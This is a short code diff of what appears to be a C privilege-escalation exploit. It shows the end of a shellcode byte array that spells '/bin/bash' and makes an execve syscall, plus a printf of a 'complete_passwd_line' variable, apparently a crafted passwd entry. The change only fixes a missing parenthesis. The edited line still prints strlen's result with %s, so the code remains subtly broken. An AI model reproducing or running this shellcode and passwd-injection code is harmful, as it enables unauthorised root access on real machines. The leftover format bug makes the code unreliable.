@@ -115,7 +115,7 @@ int main(int argc, char *argv[])
   0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53,
   0x89, 0xe1, 0xcd, 0x80
 };
-  printf("Complete shell code:\n%s\nLength of the code is %s\n", complete_passwd_line, strlen(complete_passwd_line);
+  printf("Complete shell code:\n%s\nLength of the code is %s\n", complete_passwd_line, strlen(complete_passwd_line));
 
   f = open(filename, O_RDONLY);
   fstat(f, &st);
